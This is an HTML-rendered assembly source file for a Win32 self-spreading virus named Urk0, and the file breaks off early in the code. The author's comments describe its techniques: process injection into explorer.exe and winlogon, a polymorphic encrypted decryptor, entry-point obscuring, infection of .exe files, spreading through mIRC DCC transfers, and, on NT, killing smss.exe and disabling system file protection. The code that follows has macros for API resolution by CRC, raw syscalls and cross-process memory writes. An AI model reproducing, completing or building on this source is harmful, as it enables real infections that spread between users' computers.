<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>urk0.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;THIS IS A VIRUS SOURCE CODE.NOW,THIS FILE ITS NOT DANGER.IM NOT RESPONSABLE OF DAMAGES</span><span class="sc0">
</span><span class="sc1">;IN CASE YOU COMPILE AND LINK IT TO CREATE A EXECUTABLE.THIS CODE IS ONLY FOR ENTERTAIMENT</span><span class="sc0">
</span><span class="sc1">;AND EDUCATION.</span><span class="sc0">
</span><span class="sc1">;I KNOW THIS CODE COULD TO HAVE (AND IM 99% SURE IT HAS) BUGS. I CODED IT ONLY FOR </span><span class="sc0">
</span><span class="sc1">;FUN, I NO WANT THIS VIRUS INFECTED COMPUTERS UNLESS YOU DID IT FOR UR ELECTION SO</span><span class="sc0">
</span><span class="sc1">;IM NOT REALLY WORRIED COZ THIS VIRUS IS NOT DONE FOR CORRUPT A SYSTEM.  </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;win32.Urk0 (Lady Marian 3)</span><span class="sc0">
</span><span class="sc1">;This is a Win32 virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Win9x:</span><span class="sc0">
</span><span class="sc1">;It uses a method that i havent seen in other viruses.Second part of virus(where it </span><span class="sc0">
</span><span class="sc1">;polymorphs decryptor,infects,...) is descrypted and copied directly to other process</span><span class="sc0">
</span><span class="sc1">;that previously it creates(ill try it was a process created from a random file but for</span><span class="sc0">
</span><span class="sc1">;now it do it with explorer.exe) suspended.Then it unprotect mem of primary module of</span><span class="sc0">
</span><span class="sc1">;process with VirtualProtectEx and overwrite process mem with its code since entrypoint</span><span class="sc0">
</span><span class="sc1">;of new process.Then we reanude thread of created process so virus is executed in other </span><span class="sc0">
</span><span class="sc1">;process.This can be made MAX_DEPTH times.Explorer creates other process and inject there </span><span class="sc0">
</span><span class="sc1">;its code,and again and again and again...for MAX_DEPTH times.</span><span class="sc0">
</span><span class="sc1">;I think this difficults emulation and debugging.In addition if a </span><span class="sc0">
</span><span class="sc1">;memory monitor detects a virus behaviour in memory it detects virus as other file</span><span class="sc0">
</span><span class="sc1">;(for now explorer.exe).</span><span class="sc0">
</span><span class="sc1">;Note virus never infects explorer.exe in disk,only in memory,so if virus is searched in </span><span class="sc0">
</span><span class="sc1">;explorer.exe it is not found.In addition when i create new process i pass </span><span class="sc0">
</span><span class="sc1">;CREATE_NEW_PROCESS_GROUP flag so new process is created without father...</span><span class="sc0">
</span><span class="sc1">;suppostly there isnt relation between creator process and new process.  </span><span class="sc0">
</span><span class="sc1">;In addition when virus is executing in explorer.exe it calls to RegisterServiceProcess</span><span class="sc0">
</span><span class="sc1">;so user doesnt see two explorer.exe in task list.</span><span class="sc0">
</span><span class="sc1">;With this method we return the control to host fastly becoz slow part of virus is executed</span><span class="sc0">
</span><span class="sc1">;currently with host becoz it is executing in explorer.exe where we are injected our code.</span><span class="sc0">
</span><span class="sc1">;First part of virus is encrypted.Decryptor is polimorphed.Key is changed with each generation.</span><span class="sc0">
</span><span class="sc1">;Polymorphic engine its not very complex.It interchanges registers used and inserts </span><span class="sc0">
</span><span class="sc1">;trash instructions.Trash uses recursively itself so we can find trash in this manner:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;xor reg32a,imm32a___</span><span class="sc0">
</span><span class="sc1">;add reg32b,imm32b_  |</span><span class="sc0">
</span><span class="sc1">;cli               | |</span><span class="sc0">
</span><span class="sc1">;clc               | |</span><span class="sc0">
</span><span class="sc1">;sub reg32b,imm32b_| |</span><span class="sc0">
</span><span class="sc1">;cli                 |</span><span class="sc0">
</span><span class="sc1">;cpuid               |</span><span class="sc0">
</span><span class="sc1">;...               |</span><span class="sc0">
</span><span class="sc1">;xor reg32a,imm32a___|</span><span class="sc0">
</span><span class="sc1">;...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;I wanna do it better with a v2.0 of the virus :P</span><span class="sc0">
</span><span class="sc1">;Second part is encrypted with random key.Decryptor its not poly.However,virus doesnt</span><span class="sc0">
</span><span class="sc1">;modify its code directly becoz it,while is injecting code to explorer.exe,is </span><span class="sc0">
</span><span class="sc1">;unencrypting bytes before injecting.</span><span class="sc0">
</span><span class="sc1">;It uses EPO method too.Insert a jmp(and ill insert some antidebugging trickz too)</span><span class="sc0">
</span><span class="sc1">;in entrypoint of infected file(later it restores bytes overwrited).</span><span class="sc0">
</span><span class="sc1">;Apis are gotten by CRC.</span><span class="sc0">
</span><span class="sc1">;For infection it adds itself at end of last section.Increase size of file infected.</span><span class="sc0">
</span><span class="sc1">;It only infects .exe files.</span><span class="sc0">
</span><span class="sc1">;For now Urk0 doesnt have payload(i dont know if i ll add it :-m )</span><span class="sc0">
</span><span class="sc1">;In addition Urk0 has two manners of infection.It can infect files with explorer code</span><span class="sc0">
</span><span class="sc1">;encrypted or withouth encrypting.If it isnt encrypted it have per-process characteristics.</span><span class="sc0">
</span><span class="sc1">;It works in the same manner but in addition it hooks CreateFileA api.</span><span class="sc0">
</span><span class="sc1">;It always infects mirc.exe file with per-process characteristics becoz mirc.exe use </span><span class="sc0">
</span><span class="sc1">;CreateFileA to open files that it will send(with dcc) so ill infect files before sending</span><span class="sc0">
</span><span class="sc1">;and in this manner virus will arrive other computer ;)(With mirc.exe and others similar).</span><span class="sc0">
</span><span class="sc1">;If you read this code you will see i have spend a lot of bytes that i could have not</span><span class="sc0">
</span><span class="sc1">;spend it,becoz for now i have not optimizated the code.I must optimizate it and</span><span class="sc0">
</span><span class="sc1">;optmizate poly engine.</span><span class="sc0">
</span><span class="sc1">;Structure of code:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      --------------------------------------SVirus</span><span class="sc0">
</span><span class="sc1">;      -----------------------SCode</span><span class="sc0">
</span><span class="sc1">;         (Entry point 2)</span><span class="sc0">
</span><span class="sc1">;         Code executed</span><span class="sc0">
</span><span class="sc1">;         after injecting</span><span class="sc0">
</span><span class="sc1">;         in explorer.exe</span><span class="sc0">
</span><span class="sc1">;         Encrypted with random. </span><span class="sc0">
</span><span class="sc1">;       Note if this part is</span><span class="sc0">
</span><span class="sc1">;         not encrypted some code</span><span class="sc0">
</span><span class="sc1">;         here can be executed </span><span class="sc0">
</span><span class="sc1">;         before injecting to</span><span class="sc0">
</span><span class="sc1">;         explorer for </span><span class="sc0">
</span><span class="sc1">;         perprocess propose</span><span class="sc0">
</span><span class="sc1">;      -----------------------ECode</span><span class="sc0">
</span><span class="sc1">;         (Entry point 1)</span><span class="sc0">
</span><span class="sc1">;         Decryptor of code since</span><span class="sc0">
</span><span class="sc1">;         Encrypted to EVirus       </span><span class="sc0">
</span><span class="sc1">;      -----------------------Encrypted</span><span class="sc0">
</span><span class="sc1">;         Here it creates process</span><span class="sc0">
</span><span class="sc1">;         explorer.exe and injects</span><span class="sc0">
</span><span class="sc1">;         code(unencrypting SCode</span><span class="sc0">
</span><span class="sc1">;         to ECode at same time it </span><span class="sc0">
</span><span class="sc1">;         write each dword) to </span><span class="sc0">
</span><span class="sc1">;         explorer.exe since entry</span><span class="sc0">
</span><span class="sc1">;         point of it.When it has</span><span class="sc0">
</span><span class="sc1">;         injected the code it reanude</span><span class="sc0">
</span><span class="sc1">;         explorer and infection part</span><span class="sc0">
</span><span class="sc1">;         and others important parts</span><span class="sc0">
</span><span class="sc1">;         are executed in explorer.exe</span><span class="sc0">
</span><span class="sc1">;         process.</span><span class="sc0">
</span><span class="sc1">;         Later it restore for EPO</span><span class="sc0">
</span><span class="sc1">;         overwrited bytes and jmp </span><span class="sc0">
</span><span class="sc1">;         to host          </span><span class="sc0">
</span><span class="sc1">;      --------------------------------------EVirus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;WinNT:</span><span class="sc0">
</span><span class="sc1">;In NT machines virus works in a manner very different.In Nt,virus will try to get a </span><span class="sc0">
</span><span class="sc1">;handle to winlogon.exe with full privileges,using a flaw in dbgss implemented in smss.exe</span><span class="sc0">
</span><span class="sc1">;(you can see debploit flaw in august archives,Nt focus,www.securiteam.com).Using this flaw</span><span class="sc0">
</span><span class="sc1">;we inject our code in winlogon.Note that with this flaw we have a problem,when we try to get</span><span class="sc0">
</span><span class="sc1">;a handle to winlogon with debploit method,winlogon will terminate when our program</span><span class="sc0">
</span><span class="sc1">;terminate too,becouse our program set as debugger of winlogon,and winlogon as debuggee,</span><span class="sc0">
</span><span class="sc1">;so if we attach winlogon,when we terminate,it will terminate too.For this reason,winlogon</span><span class="sc0">
</span><span class="sc1">;code will kill smss.exe.Ok,this is a dramatic solution,however i think system will work</span><span class="sc0">
</span><span class="sc1">;very well without smss.exe.Smss.exe loads winlogon.exe and user mode part of win32 ss </span><span class="sc0">
</span><span class="sc1">;in memory,and when system hangs,it takes control and show typical blue screen.In addition,</span><span class="sc0">
</span><span class="sc1">;it have implemented dbgss so if we kill it,a lot of debugger will not run(mmm...is this a</span><span class="sc0">
</span><span class="sc1">;problem??? ;).I was working a lot of time in my system with smss.exe terminated and i think</span><span class="sc0">
</span><span class="sc1">;my system worked perfectly(i wasnt be able to use debuggers...only softice).</span><span class="sc0">
</span><span class="sc1">;well,when winlogon code kills smss.exe,it disables sfp with ratter and benny method(29a</span><span class="sc0">
</span><span class="sc1">;number 6).Later it gets a handle to explorer and injects the code there.In explorer,</span><span class="sc0">
</span><span class="sc1">;virus will infect current folder of explorer.exe in intervals of 60 seconds.</span><span class="sc0">
</span><span class="sc1">;Note virus use ModuleBase + 28h for infection mark.At this offset there are 5 reserved dwords</span><span class="sc0">
</span><span class="sc1">;in dos header.I think to put infection mark in this field is a few lame :P ... i could</span><span class="sc0">
</span><span class="sc1">;to have put it in second field of time date stamp or with others methods but im not worry</span><span class="sc0">
</span><span class="sc1">;for infection mark. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;and that is all :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;SORRY BECOZ MY ENGLISH LEVEL ITS VERY LOW SO I M SORRY IF YOU DONT UNDERSTAND SOME </span><span class="sc0">
</span><span class="sc1">;EXPRESSIONS THAT I USE BADLY.HOWEVER ILL TRY TO WRITE BETTER I CAN :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;I MUST TO APOLOGIZE TOO COZ MY BADLY MANNER OF PROGRAMMING. MY CODE IS NOT OPTIMIZED</span><span class="sc0">
</span><span class="sc1">;FOR FAST AND NOT OPTIMIZED FOR SIZE :P . IN ADDITION THIS IS A CRAZY CODE :S </span><span class="sc0">
</span><span class="sc1">;REALLY,IF I HAD TO READ IT I WOULD BE VERY ANGRY WITH THE AUTHOR :P COZ PERHAPS THE CODE</span><span class="sc0">
</span><span class="sc1">;IS NOT VERY MUCH UNDERSTANDABLE. SORRY .</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;THX TO:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;OF COURSE:  ¡ XEZAW !     My dear m3Nt0r -  THX.exp 99 :)  He shows with lot of pacience </span><span class="sc0">
</span><span class="sc1">;to this poor person (me) all i know. Ill never be able to pay u all u have done for me :)</span><span class="sc0">
</span><span class="sc1">;MsCorlib who always helps me too :) a half of this virus is your ;) You are other m3Nt0r</span><span class="sc0">
</span><span class="sc1">;for me. In addition u know all things that i ask u O_O u r a genius :)</span><span class="sc0">
</span><span class="sc1">;GriYo who always helps me too.Though not directly,you are a m3Nt0r for me too :) with </span><span class="sc0">
</span><span class="sc1">;your viruses.I love Dengue :),its a bible for me ;)</span><span class="sc0">
</span><span class="sc1">;Benny&amp;Ratter,thx for that fantastic codes as Joss,ketamine,dob,all ratter's articles </span><span class="sc0">
</span><span class="sc1">;about windows, sfc disable :) and all all all ;) thx.</span><span class="sc0">
</span><span class="sc1">;My good friends VirusBust,ViR[-_-],isotope,Pato,Nightmare</span><span class="sc0">
</span><span class="sc1">;_HangMan_ &amp; Oyzzo ;) my dear msdos lovers :D</span><span class="sc0">
</span><span class="sc1">;And all people in #asm,#win32asm,#win32,#ensamblador and #virus in irc hispano </span><span class="sc0">
</span><span class="sc1">;who helped me :)</span><span class="sc0">
</span><span class="sc1">;Well,i must put here a endless list of 'THX TO' becoz a lot of people have helped me,so</span><span class="sc0">
</span><span class="sc1">;ill only say thx all :*** and of course,if someone need me im here ;)</span><span class="sc0">
</span><span class="sc1">;And a infinitely 'THX TO' for LADY MARIAN: my Dark Angel,my Black Lotus,my Takhisys,</span><span class="sc0">
</span><span class="sc1">;my Queen Of Darkness,...    :*******************************************************</span><span class="sc0">
</span><span class="sc1">;Who is Urko?</span><span class="sc0">
</span><span class="sc1">;Urko is a dog. Urko is one of my best friends. Urko is a fantastic dog becoz sometimes.....</span><span class="sc0">
</span><span class="sc1">;Urko SPEAKS! Urko is very timid and only speaks to me...and not always...urko only </span><span class="sc0">
</span><span class="sc1">;speaks when both,urko and me,we start to smoke that rare cigarretes that urko has. Then</span><span class="sc0">
</span><span class="sc1">;urko start to speak a lot of :) and we stay all night speaking,smoking and seeing films or</span><span class="sc0">
</span><span class="sc1">;playing trivial pursuit,or coding,or doing a lot of things :)</span><span class="sc0">
</span><span class="sc1">;Due this,i named this virus as win32.urk0 :)</span><span class="sc0">

</span><span class="sc2">.586p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetLastError</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">OpenProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc1">;macros</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">dir_call</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">dir_call</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">jmpz</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">dir_call</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">dir_call</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">CalcLenString</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0"> </span><span class="sc5">loopin</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">loopin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">loopin</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">BaseKernel</span><span class="sc4">,</span><span class="sc5">ApiCRC</span><span class="sc4">,</span><span class="sc5">ApiNameLen</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">BaseKernel</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">ApiCRC</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">ApiNameLen</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">GetApi</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">GezSyscall</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">BaseNtdll</span><span class="sc4">,</span><span class="sc5">ApiCRC</span><span class="sc4">,</span><span class="sc5">ApiNameLen</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc5">BaseNtdll</span><span class="sc4">,</span><span class="sc5">ApiCRC</span><span class="sc4">,</span><span class="sc5">ApiNameLen</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">syscallz</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">fc</span><span class="sc4">,</span><span class="sc5">paramz</span><span class="sc0"> </span><span class="sc1">;from Ratter's win2k.Joss </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">fc</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2eh</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,(</span><span class="sc5">paramz</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">Writez</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">BaseKernel</span><span class="sc4">,</span><span class="sc5">hProcess</span><span class="sc4">,</span><span class="sc5">OffsetInProc</span><span class="sc4">,</span><span class="sc5">Buffer</span><span class="sc4">,</span><span class="sc9">Size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc1">;for storing number of writted bytes</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">Size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OffsetInProc</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hProcess</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc5">BaseKernel</span><span class="sc4">,</span><span class="sc5">WriteMemoryProcessCRC</span><span class="sc4">,</span><span class="sc5">WMPNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">Readz</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">BaseKernel</span><span class="sc4">,</span><span class="sc5">hProcess</span><span class="sc4">,</span><span class="sc5">OffsetInProc</span><span class="sc4">,</span><span class="sc5">Buffer</span><span class="sc4">,</span><span class="sc9">Size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc1">;for storing number of read bytes</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">Size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OffsetInProc</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hProcess</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc5">BaseKernel</span><span class="sc4">,</span><span class="sc5">ReadMemoryProcessCRC</span><span class="sc4">,</span><span class="sc5">RMPNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc1">;some datas for first generation</span><span class="sc0">

</span><span class="sc5">kernel32dll</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'kernel32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">auxi</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">az</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Sleep'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">azz</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ContinueDebugEvent'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0"> 
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;vvvvvvvvvvvvvvvvvvvFIRST GENERATION CODE</span><span class="sc0">
</span><span class="sc5">jmpz</span><span class="sc0"> </span><span class="sc5">jmpedSize</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*Virus size'</span><span class="sc0">
</span><span class="sc5">virSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">EVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SVirus</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">virSize</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0FF00h</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">virSize</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">00FFh</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  

</span><span class="sc5">jmpedSize</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;for getting apis crcs:</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">az</span><span class="sc0">
</span><span class="sc5">CalcLenString</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">azz</span><span class="sc0">
</span><span class="sc5">CalcLenString</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">

</span><span class="sc1">;i unprotect code:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel32dll</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SVirus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">EVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SVirus</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">UnprotectMem</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">kernel</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc1">;ill test poly</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">Poly</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">CryptKey</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">auxi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc1">;I crypt necesary parts</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc0">
